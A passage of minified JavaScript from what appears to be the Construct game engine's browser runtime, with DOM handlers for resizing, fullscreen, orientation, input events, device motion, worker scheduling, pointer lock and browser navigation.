      }
      _OnAndroidVirtualKeyboardChange(windowHeight, vkHeight) {
        if (
          ((document.body.style.position = ''),
          (document.body.style.overflow = ''),
          (document.body.style.transform = ''),
          (this._vkTranslateYOffset = 0),
          vkHeight > 0)
        ) {
          const activeElement = document.activeElement;
          if (activeElement) {
            const rc = activeElement.getBoundingClientRect();
            let shiftY =
              (rc.top + rc.bottom) / 2 - (windowHeight - vkHeight) / 2;
            shiftY > vkHeight && (shiftY = vkHeight),
              shiftY < 0 && (shiftY = 0),
              shiftY > 0 &&
                ((document.body.style.position = 'absolute'),
                (document.body.style.overflow = 'visible'),
                (document.body.style.transform = `translateY(${-shiftY}px)`),
                (this._vkTranslateYOffset = shiftY));
          }
        }
      }
      _PostRuntimeEvent(name, data) {
        this.PostToRuntime(name, data || null, DISPATCH_RUNTIME_ONLY);
      }
      _GetWindowInnerWidth() {
        return this._iRuntime._GetWindowInnerWidth();
      }
      _GetWindowInnerHeight() {
        return this._iRuntime._GetWindowInnerHeight();
      }
      _EnableWindowResizeEvent() {
        (this._enableWindowResizeEvent = !0),
          (this._lastWindowWidth = this._iRuntime._GetWindowInnerWidth()),
          (this._lastWindowHeight = this._iRuntime._GetWindowInnerHeight());
      }
      _OnWindowResize() {
        if (this._isExportToVideo) return;
        if (!this._enableWindowResizeEvent) return;
        const width = this._GetWindowInnerWidth(),
          height = this._GetWindowInnerHeight();
        if (this._iRuntime.IsAndroidWebView())
          if (this._enableAndroidVKDetection) {
            if (
              this._lastWindowWidth === width &&
              height < this._lastWindowHeight
            )
              return (
                (this._virtualKeyboardHeight = this._lastWindowHeight - height),
                void this._OnAndroidVirtualKeyboardChange(
                  this._lastWindowHeight,
                  this._virtualKeyboardHeight
                )
              );
            this._virtualKeyboardHeight > 0 &&
              ((this._virtualKeyboardHeight = 0),
              this._OnAndroidVirtualKeyboardChange(
                height,
                this._virtualKeyboardHeight
              )),
              (this._lastWindowWidth = width),
              (this._lastWindowHeight = height);
          } else
            (this._lastWindowWidth = width), (this._lastWindowHeight = height);
        this.PostToRuntime('window-resize', {
          innerWidth: width,
          innerHeight: height,
          devicePixelRatio: window.devicePixelRatio,
          isFullscreen: RuntimeInterface.IsDocumentFullscreen(),
          cssDisplayMode: this._iRuntime.GetCssDisplayMode(),
        }),
          this._iRuntime.IsiOSWebView() &&
            (-1 !== this._simulatedResizeTimerId &&
              clearTimeout(this._simulatedResizeTimerId),
            this._OnSimulatedResize(width, height, 0));
      }
      _ScheduleSimulatedResize(width, height, count) {
        -1 !== this._simulatedResizeTimerId &&
          clearTimeout(this._simulatedResizeTimerId),
          (this._simulatedResizeTimerId = setTimeout(
            () => this._OnSimulatedResize(width, height, count),
            48
          ));
      }
      _OnSimulatedResize(originalWidth, originalHeight, count) {
        const width = this._GetWindowInnerWidth(),
          height = this._GetWindowInnerHeight();
        (this._simulatedResizeTimerId = -1),
          width != originalWidth || height != originalHeight
            ? this.PostToRuntime('window-resize', {
                innerWidth: width,
                innerHeight: height,
                devicePixelRatio: window.devicePixelRatio,
                isFullscreen: RuntimeInterface.IsDocumentFullscreen(),
                cssDisplayMode: this._iRuntime.GetCssDisplayMode(),
              })
            : count < 10 &&
              this._ScheduleSimulatedResize(width, height, count + 1);
      }
      _OnSetTargetOrientation(e) {
        this._targetOrientation = e.targetOrientation;
      }
      _TrySetTargetOrientation() {
        const orientation = this._targetOrientation;
        if (screen.orientation && screen.orientation.lock)
          screen.orientation
            .lock(orientation)
            .catch((err) =>
              console.warn('[Construct] Failed to lock orientation: ', err)
            );
        else
          try {
            let result = !1;
            screen.lockOrientation
              ? (result = screen.lockOrientation(orientation))
              : screen.webkitLockOrientation
              ? (result = screen.webkitLockOrientation(orientation))
              : screen.mozLockOrientation
              ? (result = screen.mozLockOrientation(orientation))
              : screen.msLockOrientation &&
                (result = screen.msLockOrientation(orientation)),
              result || console.warn('[Construct] Failed to lock orientation');
          } catch (err) {
            console.warn('[Construct] Failed to lock orientation: ', err);
          }
      }
      _OnFullscreenChange() {
        if (this._isExportToVideo) return;
        const isDocFullscreen = RuntimeInterface.IsDocumentFullscreen();
        isDocFullscreen &&
          'any' !== this._targetOrientation &&
          this._TrySetTargetOrientation(),
          this.PostToRuntime('fullscreenchange', {
            isFullscreen: isDocFullscreen,
            innerWidth: this._GetWindowInnerWidth(),
            innerHeight: this._GetWindowInnerHeight(),
          });
      }
      _OnFullscreenError(e) {
        console.warn('[Construct] Fullscreen request failed: ', e),
          this.PostToRuntime('fullscreenerror', {
            isFullscreen: RuntimeInterface.IsDocumentFullscreen(),
            innerWidth: this._GetWindowInnerWidth(),
            innerHeight: this._GetWindowInnerHeight(),
          });
      }
      _OnVisibilityChange(isHidden) {
        if (
          this._pageVisibilityIsHidden !== isHidden &&
          ((this._pageVisibilityIsHidden = isHidden),
          isHidden
            ? this._iRuntime._CancelAnimationFrame()
            : this._iRuntime._RequestAnimationFrame(),
          this.PostToRuntime('visibilitychange', { hidden: isHidden }),
          !isHidden && this._iRuntime.IsiOSWebView())
        ) {
          const resetScrollFunc = () => {
            (document.scrollingElement.scrollTop = 0),
              (document.scrollingElement.scrollLeft = 0);
          };
          setTimeout(resetScrollFunc, 50),
            setTimeout(resetScrollFunc, 100),
            setTimeout(resetScrollFunc, 250),
            setTimeout(resetScrollFunc, 500);
        }
      }
      _OnKeyEvent(name, e) {
        if (
          ('Backspace' === e.key && PreventDefaultOnCanvasOrDoc(e),
          'nwjs' === this._iRuntime.GetExportType() &&
            'u' === e.key &&
            (e.ctrlKey || e.metaKey) &&
            e.preventDefault(),
          this._isExportToVideo)
        )
          return;
        const code = KEY_CODE_ALIASES.get(e.code) || e.code;
        this._PostToRuntimeMaybeSync(
          name,
          {
            code: code,
            key: e.key,
            which: e.which,
            repeat: e.repeat,
            altKey: e.altKey,
            ctrlKey: e.ctrlKey,
            metaKey: e.metaKey,
            shiftKey: e.shiftKey,
            timeStamp: e.timeStamp,
          },
          DISPATCH_RUNTIME_AND_SCRIPT
        );
      }
      _OnMouseWheelEvent(name, e, opts) {
        this._isExportToVideo ||
          this.PostToRuntime(
            name,
            {
              clientX: e.clientX,
              clientY: e.clientY + this._vkTranslateYOffset,
              pageX: e.pageX,
              pageY: e.pageY + this._vkTranslateYOffset,
              deltaX: e.deltaX,
              deltaY: e.deltaY,
              deltaZ: e.deltaZ,
              deltaMode: e.deltaMode,
              timeStamp: e.timeStamp,
            },
            opts
          );
      }
      _OnMouseEvent(name, e, opts) {
        this._isExportToVideo ||
          IsCompatibilityMouseEvent(e) ||
          this._PostToRuntimeMaybeSync(
            name,
            {
              button: e.button,
              buttons: e.buttons,
              clientX: e.clientX,
              clientY: e.clientY + this._vkTranslateYOffset,
              pageX: e.pageX,
              pageY: e.pageY + this._vkTranslateYOffset,
              movementX: e.movementX || 0,
              movementY: e.movementY || 0,
              timeStamp: e.timeStamp,
            },
            opts
          );
      }
      _OnPointerEvent(name, e) {
        if (this._isExportToVideo) return;
        let lastButtons = 0;
        'mouse' === e.pointerType &&
          (lastButtons = this._mousePointerLastButtons),
          this._PostToRuntimeMaybeSync(
            name,
            {
              pointerId: e.pointerId,
              pointerType: e.pointerType,
              button: e.button,
              buttons: e.buttons,
              lastButtons: lastButtons,
              clientX: e.clientX,
              clientY: e.clientY + this._vkTranslateYOffset,
              pageX: e.pageX,
              pageY: e.pageY + this._vkTranslateYOffset,
              movementX: e.movementX || 0,
              movementY: e.movementY || 0,
              width: e.width || 0,
              height: e.height || 0,
              pressure: e.pressure || 0,
              tangentialPressure: e.tangentialPressure || 0,
              tiltX: e.tiltX || 0,
              tiltY: e.tiltY || 0,
              twist: e.twist || 0,
              timeStamp: e.timeStamp,
            },
            DISPATCH_RUNTIME_AND_SCRIPT
          ),
          'mouse' === e.pointerType &&
            (this._mousePointerLastButtons = e.buttons);
      }
      _OnPointerRawUpdate(e) {
        this._OnPointerEvent('pointermove', e);
      }
      _OnTouchEvent(fireName, e) {
        if (!this._isExportToVideo)
          for (let i = 0, len = e.changedTouches.length; i < len; ++i) {
            const t = e.changedTouches[i];
            this._PostToRuntimeMaybeSync(
              fireName,
              {
                pointerId: t.identifier,
                pointerType: 'touch',
                button: 0,
                buttons: 0,
                lastButtons: 0,
                clientX: t.clientX,
                clientY: t.clientY + this._vkTranslateYOffset,
                pageX: t.pageX,
                pageY: t.pageY + this._vkTranslateYOffset,
                movementX: e.movementX || 0,
                movementY: e.movementY || 0,
                width: 2 * (t.radiusX || t.webkitRadiusX || 0),
                height: 2 * (t.radiusY || t.webkitRadiusY || 0),
                pressure: t.force || t.webkitForce || 0,
                tangentialPressure: 0,
                tiltX: 0,
                tiltY: 0,
                twist: t.rotationAngle || 0,
                timeStamp: e.timeStamp,
              },
              DISPATCH_RUNTIME_AND_SCRIPT
            );
          }
      }
      _HandlePointerDownFocus(e) {
        window !== window.top && window.focus(),
          this._IsElementCanvasOrDocument(e.target) &&
            document.activeElement &&
            !this._IsElementCanvasOrDocument(document.activeElement) &&
            document.activeElement.blur();
      }
      _IsElementCanvasOrDocument(elem) {
        return (
          !elem ||
          elem === document ||
          elem === window ||
          elem === document.body ||
          'canvas' === elem.tagName.toLowerCase()
        );
      }
      _AttachDeviceOrientationEvent() {
        this._attachedDeviceOrientationEvent ||
          ((this._attachedDeviceOrientationEvent = !0),
          window.addEventListener('deviceorientation', (e) =>
            this._OnDeviceOrientation(e)
          ),
          window.addEventListener('deviceorientationabsolute', (e) =>
            this._OnDeviceOrientationAbsolute(e)
          ));
      }
      _AttachDeviceMotionEvent() {
        this._attachedDeviceMotionEvent ||
          ((this._attachedDeviceMotionEvent = !0),
          window.addEventListener('devicemotion', (e) =>
            this._OnDeviceMotion(e)
          ));
      }
      _OnDeviceOrientation(e) {
        this._isExportToVideo ||
          this.PostToRuntime(
            'deviceorientation',
            {
              absolute: !!e.absolute,
              alpha: e.alpha || 0,
              beta: e.beta || 0,
              gamma: e.gamma || 0,
              timeStamp: e.timeStamp,
              webkitCompassHeading: e.webkitCompassHeading,
              webkitCompassAccuracy: e.webkitCompassAccuracy,
            },
            DISPATCH_RUNTIME_AND_SCRIPT
          );
      }
      _OnDeviceOrientationAbsolute(e) {
        this._isExportToVideo ||
          this.PostToRuntime(
            'deviceorientationabsolute',
            {
              absolute: !!e.absolute,
              alpha: e.alpha || 0,
              beta: e.beta || 0,
              gamma: e.gamma || 0,
              timeStamp: e.timeStamp,
            },
            DISPATCH_RUNTIME_AND_SCRIPT
          );
      }
      _OnDeviceMotion(e) {
        if (this._isExportToVideo) return;
        let accProp = null;
        const acc = e.acceleration;
        acc && (accProp = { x: acc.x || 0, y: acc.y || 0, z: acc.z || 0 });
        let withGProp = null;
        const withG = e.accelerationIncludingGravity;
        withG &&
          (withGProp = { x: withG.x || 0, y: withG.y || 0, z: withG.z || 0 });
        let rotationRateProp = null;
        const rotationRate = e.rotationRate;
        rotationRate &&
          (rotationRateProp = {
            alpha: rotationRate.alpha || 0,
            beta: rotationRate.beta || 0,
            gamma: rotationRate.gamma || 0,
          }),
          this.PostToRuntime(
            'devicemotion',
            {
              acceleration: accProp,
              accelerationIncludingGravity: withGProp,
              rotationRate: rotationRateProp,
              interval: e.interval,
              timeStamp: e.timeStamp,
            },
            DISPATCH_RUNTIME_AND_SCRIPT
          );
      }
      _OnInvokeDownload(e) {
        const url = e.url,
          filename = e.filename,
          a = document.createElement('a'),
          body = document.body;
        (a.textContent = filename),
          (a.href = url),
          (a.download = filename),
          body.appendChild(a),
          a.click(),
          body.removeChild(a);
      }
      async _OnLoadWebFonts(e) {
        const webfonts = e.webfonts;
        await Promise.all(
          webfonts.map(async (info) => {
            const fontFace = new FontFace(info.name, `url('${info.url}')`);
            document.fonts.add(fontFace), await fontFace.load();
          })
        );
      }
      async _OnRasterSvgImage(e) {
        const blob = e.blob,
          imageWidth = e.imageWidth,
          imageHeight = e.imageHeight,
          surfaceWidth = e.surfaceWidth,
          surfaceHeight = e.surfaceHeight,
          imageBitmapOpts = e.imageBitmapOpts,
          canvas = await self.C3_RasterSvgImageBlob(
            blob,
            imageWidth,
            imageHeight,
            surfaceWidth,
            surfaceHeight
          );
        let ret;
        return (
          (ret = imageBitmapOpts
            ? await createImageBitmap(canvas, imageBitmapOpts)
            : await createImageBitmap(canvas)),
          { imageBitmap: ret, transferables: [ret] }
        );
      }
      async _OnGetSvgImageSize(e) {
        return await self.C3_GetSvgImageSize(e.blob);
      }
      async _OnAddStylesheet(e) {
        var cssUrl;
        await ((cssUrl = e.url),
        new Promise((resolve, reject) => {
          const styleLink = document.createElement('link');
          (styleLink.onload = () => resolve(styleLink)),
            (styleLink.onerror = (err) => reject(err)),
            (styleLink.rel = 'stylesheet'),
            (styleLink.href = cssUrl),
            document.head.appendChild(styleLink);
        }));
      }
      _PlayPendingMedia() {
        const mediaToTryPlay = [...this._mediaPendingPlay];
        if ((this._mediaPendingPlay.clear(), !this._isSilent))
          for (const mediaElem of mediaToTryPlay) {
            const playRet = mediaElem.play();
            playRet &&
              playRet.catch((err) => {
                this._mediaRemovedPendingPlay.has(mediaElem) ||
                  this._mediaPendingPlay.add(mediaElem);
              });
          }
      }
      TryPlayMedia(mediaElem) {
        if ('function' != typeof mediaElem.play)
          throw new Error('missing play function');
        let playRet;
        this._mediaRemovedPendingPlay.delete(mediaElem);
        try {
          playRet = mediaElem.play();
        } catch (err) {
          return void this._mediaPendingPlay.add(mediaElem);
        }
        playRet &&
          playRet.catch((err) => {
            this._mediaRemovedPendingPlay.has(mediaElem) ||
              this._mediaPendingPlay.add(mediaElem);
          });
      }
      RemovePendingPlay(mediaElem) {
        this._mediaPendingPlay.delete(mediaElem),
          this._mediaRemovedPendingPlay.add(mediaElem);
      }
      SetSilent(s) {
        this._isSilent = !!s;
      }
      _OnHideCordovaSplash() {
        navigator.splashscreen &&
          navigator.splashscreen.hide &&
          navigator.splashscreen.hide();
      }
      _OnDebugHighlight(e) {
        if (!e.show)
          return void (
            this._debugHighlightElem &&
            (this._debugHighlightElem.style.display = 'none')
          );
        this._debugHighlightElem ||
          ((this._debugHighlightElem = document.createElement('div')),
          (this._debugHighlightElem.id = 'inspectOutline'),
          document.body.appendChild(this._debugHighlightElem));
        const elem = this._debugHighlightElem;
        (elem.style.display = ''),
          (elem.style.left = e.left - 1 + 'px'),
          (elem.style.top = e.top - 1 + 'px'),
          (elem.style.width = e.width + 2 + 'px'),
          (elem.style.height = e.height + 2 + 'px'),
          (elem.textContent = e.name);
      }
      _OnRegisterSW() {
        window.C3_RegisterSW && window.C3_RegisterSW();
      }
      _OnPostToDebugger(data) {
        window.c3_postToMessagePort &&
          ((data.from = 'runtime'), window.c3_postToMessagePort(data));
      }
      _InvokeFunctionFromJS(name, params) {
        return this.PostToRuntimeAsync('js-invoke-function', {
          name: name,
          params: params,
        });
      }
      _OnScriptCreateWorker(e) {
        const url = e.url,
          opts = e.opts,
          port2 = e.port2;
        new Worker(url, opts).postMessage(
          { type: 'construct-worker-init', port2: port2 },
          [port2]
        );
      }
      _OnAlert(e) {
        alert(e.message);
      }
      _OnScreenReaderTextEvent(e) {
        const type = e.type;
        if ('create' === type) {
          const p = document.createElement('p');
          (p.id = 'c3-sr-' + e.id),
            (p.textContent = e.text),
            this._screenReaderTextWrap.appendChild(p);
        } else if ('update' === type) {
          const p = document.getElementById('c3-sr-' + e.id);
          p
            ? (p.textContent = e.text)
            : console.warn(
                `[Construct] Missing screen reader text with id ${e.id}`
              );
        } else if ('release' === type) {
          const p = document.getElementById('c3-sr-' + e.id);
          p
            ? p.remove()
            : console.warn(
                `[Construct] Missing screen reader text with id ${e.id}`
              );
        } else
          console.warn(
            `[Construct] Unknown screen reader text update '${type}'`
          );
      }
      _SetExportingToVideo(e) {
        this._isExportToVideo = !0;
        const headerElem = document.createElement('h1');
        (headerElem.id = 'exportToVideoMessage'),
          (headerElem.textContent = e.message),
          document.body.prepend(headerElem),
          document.body.classList.add('exportingToVideo'),
          (this.GetRuntimeInterface().GetMainCanvas().style.display = ''),
          this._iRuntime.SetIsExportingToVideo(e.duration);
      }
      _OnExportVideoProgress(e) {
        (this._exportVideoProgressMessage = e.message),
          -1 === this._exportVideoUpdateTimerId &&
            (this._exportVideoUpdateTimerId = setTimeout(
              () => this._DoUpdateExportVideoProgressMessage(),
              250
            ));
      }
      _DoUpdateExportVideoProgressMessage() {
        this._exportVideoUpdateTimerId = -1;
        const headerElem = document.getElementById('exportToVideoMessage');
        headerElem &&
          (headerElem.textContent = this._exportVideoProgressMessage);
      }
      _OnExportedToVideo(e) {
        window.c3_postToMessagePort({
          type: 'exported-video',
          arrayBuffer: e.arrayBuffer,
          contentType: e.contentType,
          time: e.time,
        });
      }
      _OnExportedToImageSequence(e) {
        window.c3_postToMessagePort({
          type: 'exported-image-sequence',
          blobArr: e.blobArr,
          time: e.time,
          gif: e.gif,
        });
      }
    };
  RuntimeInterface.AddDOMHandlerClass(HANDLER_CLASS);
}
{
  const DISPATCH_WORKER_SCRIPT_NAME = 'dispatchworker.js',
    JOB_WORKER_SCRIPT_NAME = 'jobworker.js';
  self.JobSchedulerDOM = class JobSchedulerDOM {
    constructor(runtimeInterface) {
      (this._runtimeInterface = runtimeInterface),
        (this._baseUrl = runtimeInterface.GetRuntimeBaseURL()),
        'preview' === runtimeInterface.GetExportType()
          ? (this._baseUrl += 'workers/')
          : (this._baseUrl += runtimeInterface.GetScriptFolder()),
        (this._maxNumWorkers = Math.min(
          navigator.hardwareConcurrency || 2,
          16
        )),
        (this._dispatchWorker = null),
        (this._jobWorkers = []),
        (this._inputPort = null),
        (this._outputPort = null);
    }
    _GetWorkerScriptFolder() {
      return 'playable-ad' === this._runtimeInterface.GetExportType()
        ? this._runtimeInterface.GetScriptFolder()
        : '';
    }
    async Init() {
      if (this._hasInitialised) throw new Error('already initialised');
      this._hasInitialised = !0;
      const dispatchWorkerScriptUrl = this._runtimeInterface._GetWorkerURL(
        this._GetWorkerScriptFolder() + DISPATCH_WORKER_SCRIPT_NAME
      );
      this._dispatchWorker = await this._runtimeInterface.CreateWorker(
        dispatchWorkerScriptUrl,
        this._baseUrl,
        { name: 'DispatchWorker' }
      );
      const messageChannel = new MessageChannel();
      (this._inputPort = messageChannel.port1),
        this._dispatchWorker.postMessage(
          { type: '_init', 'in-port': messageChannel.port2 },
          [messageChannel.port2]
        ),
        (this._outputPort = await this._CreateJobWorker());
    }
    async _CreateJobWorker() {
      const number = this._jobWorkers.length,
        jobWorkerScriptUrl = this._runtimeInterface._GetWorkerURL(
          this._GetWorkerScriptFolder() + JOB_WORKER_SCRIPT_NAME
        ),
        jobWorker = await this._runtimeInterface.CreateWorker(
          jobWorkerScriptUrl,
          this._baseUrl,
          { name: 'JobWorker' + number }
        ),
        dispatchChannel = new MessageChannel(),
        outputChannel = new MessageChannel();
      return (
        this._dispatchWorker.postMessage(
          { type: '_addJobWorker', port: dispatchChannel.port1 },
          [dispatchChannel.port1]
        ),
        jobWorker.postMessage(
          {
            type: 'init',
            number: number,
            'dispatch-port': dispatchChannel.port2,
            'output-port': outputChannel.port2,
          },
          [dispatchChannel.port2, outputChannel.port2]
        ),
        this._jobWorkers.push(jobWorker),
        outputChannel.port1
      );
    }
    GetPortData() {
      return {
        inputPort: this._inputPort,
        outputPort: this._outputPort,
        maxNumWorkers: this._maxNumWorkers,
      };
    }
    GetPortTransferables() {
      return [this._inputPort, this._outputPort];
    }
  };
}
if (window.C3_Is_Supported) {
  const enableWorker = !0;
  window.c3_runtimeInterface = new self.RuntimeInterface({
    useWorker: enableWorker,
    workerMainUrl: 'workermain.js',
    engineScripts: ['scripts/c3runtime.js'],
    projectScripts: [],
    mainProjectScript: '',
    scriptFolder: 'scripts/',
    workerDependencyScripts: [],
    exportType: 'html5',
  });
}
{
  const DOM_COMPONENT_ID = 'mouse',
    HANDLER_CLASS = class MouseDOMHandler extends self.DOMHandler {
      constructor(iRuntime) {
        super(iRuntime, DOM_COMPONENT_ID),
          this.AddRuntimeMessageHandlers([
            ['cursor', (e) => this._OnChangeCursorStyle(e)],
            ['request-pointer-lock', () => this._OnRequestPointerLock()],
            ['release-pointer-lock', () => this._OnReleasePointerLock()],
          ]),
          document.addEventListener('pointerlockchange', (e) =>
            this._OnPointerLockChange()
          ),
          document.addEventListener('pointerlockerror', (e) =>
            this._OnPointerLockError()
          );
      }
      _OnChangeCursorStyle(e) {
        document.documentElement.style.cursor = e;
      }
      _OnRequestPointerLock() {
        this._iRuntime.GetMainCanvas().requestPointerLock();
      }
      _OnReleasePointerLock() {
        document.exitPointerLock();
      }
      _OnPointerLockChange() {
        this.PostToRuntime('pointer-lock-change', {
          'has-pointer-lock': !!document.pointerLockElement,
        });
      }
      _OnPointerLockError() {
        this.PostToRuntime('pointer-lock-error', {
          'has-pointer-lock': !!document.pointerLockElement,
        });
      }
    };
  self.RuntimeInterface.AddDOMHandlerClass(HANDLER_CLASS);
}
{
  let deferredInstallPromptEvent = null,
    browserDomHandler = null;
  function elemsForSelector(selector, isAll) {
    if (selector) {
      if (isAll) return Array.from(document.querySelectorAll(selector));
      {
        const e = document.querySelector(selector);
        return e ? [e] : [];
      }
    }
    return [document.documentElement];
  }
  function noop() {}
  window.addEventListener(
    'beforeinstallprompt',
    (e) => (
      e.preventDefault(),
      (deferredInstallPromptEvent = e),
      browserDomHandler && browserDomHandler._OnBeforeInstallPrompt(),
      !1
    )
  );
  const DOM_COMPONENT_ID = 'browser',
    HANDLER_CLASS = class BrowserDOMHandler extends self.DOMHandler {
      constructor(iRuntime) {
        super(iRuntime, DOM_COMPONENT_ID),
          (this._exportType = ''),
          this.AddRuntimeMessageHandlers([
            ['get-initial-state', (e) => this._OnGetInitialState(e)],
            ['ready-for-sw-messages', () => this._OnReadyForSWMessages()],
            ['alert', (e) => this._OnAlert(e)],
            ['close', () => this._OnClose()],
            ['set-focus', (e) => this._OnSetFocus(e)],
            ['vibrate', (e) => this._OnVibrate(e)],
            ['lock-orientation', (e) => this._OnLockOrientation(e)],
            ['unlock-orientation', () => this._OnUnlockOrientation()],
            ['navigate', (e) => this._OnNavigate(e)],
            ['request-fullscreen', (e) => this._OnRequestFullscreen(e)],
            ['exit-fullscreen', () => this._OnExitFullscreen()],
            ['set-hash', (e) => this._OnSetHash(e)],
            ['set-document-css-style', (e) => this._OnSetDocumentCSSStyle(e)],
            ['get-document-css-style', (e) => this._OnGetDocumentCSSStyle(e)],
            ['set-window-size', (e) => this._OnSetWindowSize(e)],
            ['set-window-position', (e) => this._OnSetWindowPosition(e)],
            ['request-install', () => this._OnRequestInstall()],
          ]),
          window.addEventListener('online', () =>
            this._OnOnlineStateChanged(!0)
          ),
          window.addEventListener('offline', () =>
            this._OnOnlineStateChanged(!1)
          ),
          window.addEventListener('hashchange', () => this._OnHashChange()),
          document.addEventListener('backbutton', () =>
            this._OnCordovaBackButton()
          );
      }
      Attach() {
        deferredInstallPromptEvent
          ? this._OnBeforeInstallPrompt()
          : (browserDomHandler = this),
          window.addEventListener('appinstalled', () => this._OnAppInstalled());
      }
      _OnGetInitialState(e) {
        return (
          (this._exportType = e.exportType),
          {
            location: location.toString(),
            isOnline: !!navigator.onLine,
            referrer: document.referrer,
            title: document.title,
            isCookieEnabled: !!navigator.cookieEnabled,
            screenWidth: screen.width,
            screenHeight: screen.height,
            windowOuterWidth: window.outerWidth,
            windowOuterHeight: window.outerHeight,
            isConstructArcade: void 0 !== window.is_scirra_arcade,
          }
        );
      }
      _OnReadyForSWMessages() {
        window.C3_RegisterSW &&
          window.OfflineClientInfo &&
          window.OfflineClientInfo.SetMessageCallback((e) =>
            this.PostToRuntime('sw-message', e.data)
          );
      }
      _OnBeforeInstallPrompt() {
        this.PostToRuntime('install-available');
      }
      async _OnRequestInstall() {
        if (!deferredInstallPromptEvent) return { result: 'unavailable' };
        try {
          deferredInstallPromptEvent.prompt();
          return {
            result: (await deferredInstallPromptEvent.userChoice).outcome,
          };
        } catch (err) {
          return (
            console.error('[Construct] Requesting install failed: ', err),
            { result: 'failed' }
          );
        }
      }
      _OnAppInstalled() {
        this.PostToRuntime('app-installed');
      }
      _OnOnlineStateChanged(isOnline) {
        this.PostToRuntime('online-state', { isOnline: isOnline });
      }
      _OnCordovaBackButton() {
        this.PostToRuntime('backbutton');
      }
      GetNWjsWindow() {
        return 'nwjs' === this._exportType ? nw.Window.get() : null;
      }
      _OnAlert(e) {
        alert(e.message);
      }
      _OnClose() {
        navigator.app && navigator.app.exitApp
          ? navigator.app.exitApp()
          : navigator.device && navigator.device.exitApp
          ? navigator.device.exitApp()
          : window.close();
      }
      _OnSetFocus(e) {
        const isFocus = e.isFocus;
        if ('nwjs' === this._exportType) {
          const win = this.GetNWjsWindow();
          isFocus ? win.focus() : win.blur();
        } else isFocus ? window.focus() : window.blur();
      }
      _OnVibrate(e) {
        navigator.vibrate && navigator.vibrate(e.pattern);
      }
      _OnLockOrientation(e) {
        const orientation = e.orientation;
        if (screen.orientation && screen.orientation.lock)
          screen.orientation
            .lock(orientation)
            .catch((err) =>
              console.warn('[Construct] Failed to lock orientation: ', err)
            );
        else
          try {
            let result = !1;
            screen.lockOrientation
              ? (result = screen.lockOrientation(orientation))
              : screen.webkitLockOrientation
              ? (result = screen.webkitLockOrientation(orientation))
              : screen.mozLockOrientation
              ? (result = screen.mozLockOrientation(orientation))
              : screen.msLockOrientation &&
                (result = screen.msLockOrientation(orientation)),
              result || console.warn('[Construct] Failed to lock orientation');
          } catch (err) {
            console.warn('[Construct] Failed to lock orientation: ', err);
          }
      }
      _OnUnlockOrientation() {
        try {
          screen.orientation && screen.orientation.unlock
            ? screen.orientation.unlock()
            : screen.unlockOrientation
            ? screen.unlockOrientation()
            : screen.webkitUnlockOrientation
            ? screen.webkitUnlockOrientation()
            : screen.mozUnlockOrientation
            ? screen.mozUnlockOrientation()
            : screen.msUnlockOrientation && screen.msUnlockOrientation();
        } catch (err) {}
      }
      _OnNavigate(e) {
        const type = e.type;
        if ('back' === type)
          navigator.app && navigator.app.backHistory
            ? navigator.app.backHistory()
            : window.history.back();
        else if ('forward' === type) window.history.forward();
        else if ('reload' === type) location.reload();
        else if ('url' === type) {
          const url = e.url,
            target = e.target,
            exportType = e.exportType;
          self.cordova && self.cordova.InAppBrowser
            ? self.cordova.InAppBrowser.open(url, '_system')
            : 'preview' === exportType || this._iRuntime.IsAnyWebView2Wrapper()
            ? window.open(url, '_blank')
            : this._isConstructArcade ||
              (2 === target
                ? (window.top.location = url)
                : 1 === target
                ? (window.parent.location = url)
                : (window.location = url));
        } else if ('new-window' === type) {
          const url = e.url,
            tag = e.tag;
          self.cordova && self.cordova.InAppBrowser
            ? self.cordova.InAppBrowser.open(url, '_system')
            : window.open(url, tag);
        }
      }
      _OnRequestFullscreen(e) {
        if (
          this._iRuntime.IsAnyWebView2Wrapper() ||
          'macos-wkwebview' === this._exportType
        )
          self.RuntimeInterface._SetWrapperIsFullscreenFlag(!0),
            this._iRuntime._SendWrapperMessage({
              type: 'set-fullscreen',
              fullscreen: !0,
            });
        else {
          const opts = { navigationUI: 'auto' },
            navUI = e.navUI;
          1 === navUI
            ? (opts.navigationUI = 'hide')
            : 2 === navUI && (opts.navigationUI = 'show');
          const elem = document.documentElement;
          let ret;
          elem.requestFullscreen
            ? (ret = elem.requestFullscreen(opts))
            : elem.mozRequestFullScreen
            ? (ret = elem.mozRequestFullScreen(opts))
            : elem.msRequestFullscreen
            ? (ret = elem.msRequestFullscreen(opts))
            : elem.webkitRequestFullScreen &&
              (ret =
                void 0 !== Element.ALLOW_KEYBOARD_INPUT
                  ? elem.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT)
                  : elem.webkitRequestFullScreen()),
            ret instanceof Promise && ret.catch(noop);
        }
      }
      _OnExitFullscreen() {
        if (
          this._iRuntime.IsAnyWebView2Wrapper() ||
          'macos-wkwebview' === this._exportType
        )
          self.RuntimeInterface._SetWrapperIsFullscreenFlag(!1),
            this._iRuntime._SendWrapperMessage({
              type: 'set-fullscreen',
              fullscreen: !1,
            });
        else {
          let ret;
          document.exitFullscreen
            ? (ret = document.exitFullscreen())
            : document.mozCancelFullScreen
            ? (ret = document.mozCancelFullScreen())
            : document.msExitFullscreen
            ? (ret = document.msExitFullscreen())
            : document.webkitCancelFullScreen &&
              (ret = document.webkitCancelFullScreen()),
            ret instanceof Promise && ret.catch(noop);
        }
      }
      _OnSetHash(e) {
        location.hash = e.hash;
      }
      _OnHashChange() {
        this.PostToRuntime('hashchange', { location: location.toString() });
      }
      _OnSetDocumentCSSStyle(e) {
        const prop = e.prop,
          value = e.value,
          selector = e.selector,
          isAll = e['is-all'];
        try {
          const arr = elemsForSelector(selector, isAll);
          for (const e of arr)
            prop.startsWith('--')
              ? e.style.setProperty(prop, value)
              : (e.style[prop] = value);
        } catch (err) {
          console.warn('[Browser] Failed to set style: ', err);
        }
      }
      _OnGetDocumentCSSStyle(e) {
        const prop = e.prop,
          selector = e.selector;
        try {
          const elem = document.querySelector(selector);
          if (elem) {
            return {
              isOk: !0,
              result: window.getComputedStyle(elem).getPropertyValue(prop),
            };
          }
          return { isOk: !1 };
        } catch (err) {
          return (
            console.warn('[Browser] Failed to get style: ', err), { isOk: !1 }
          );
        }
      }
      _OnSetWindowSize(e) {
        window.resizeTo(e.windowWidth, e.windowHeight);
      }
      _OnSetWindowPosition(e) {
        window.moveTo(e.windowX, e.windowY);
      }
    };
  self.RuntimeInterface.AddDOMHandlerClass(HANDLER_CLASS);
}
{
  const DOM_COMPONENT_ID = 'touch',
    HANDLER_CLASS = class TouchDOMHandler extends self.DOMHandler {
      constructor(iRuntime) {
        super(iRuntime, DOM_COMPONENT_ID),
